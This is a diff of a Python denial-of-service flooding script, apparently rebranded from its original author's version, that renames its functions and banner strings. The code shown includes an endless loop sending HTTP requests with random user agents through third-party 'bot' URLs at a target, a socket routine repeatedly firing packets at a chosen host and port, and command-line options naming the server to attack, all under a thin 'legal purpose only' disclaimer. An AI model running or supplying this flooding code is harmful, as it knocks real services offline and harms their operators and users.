@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Kabir-X-SHAURYA Dos Script v.1
+# python 3.3.2+ kabirXshaurya Dos Script v.1
 # by Can Yalçın
 # only for legal purpose
 
@@ -31,11 +31,11 @@ def my_bots():
 	return(bots)
 
 
-def bot_Kabir-X-SHAURYAing(url):
+def bot_kabirXshauryaing(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is Kabir-X-SHAURYA ddosing...\033[0m")
+			print("\033[94mbot is kabirXshaurya ddosing...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,7 +49,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Kabir-X-SHAURYAing--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! kabirXshauryaing--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -70,15 +70,15 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_Kabir-X-SHAURYAing(random.choice(bots)+"http://"+host)
+		bot_kabirXshauryaing(random.choice(bots)+"http://"+host)
 		w.task_done()
 
 
 def usage():
-	print (''' \033[92m	Kabir-X-SHAURYA Dos Script v.1 https://cyweb.github.io/Kabir-X-SHAURYA/
+	print (''' \033[92m	kabirXshaurya Dos Script v.1 https://cyweb.github.io/kabirXshaurya/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
-	usage : python3 Kabir-X-SHAURYA.py [-s] [-p] [-t]
+	usage : python3 kabirXshaurya.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
@@ -91,7 +91,7 @@ def get_parameters():
 	global port
 	global thr
 	global item
-	optp = OptionParser(add_help_option=False,epilog="Kabir-X-SHAURYAs")
+	optp = OptionParser(add_help_option=False,epilog="kabirXshauryas")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
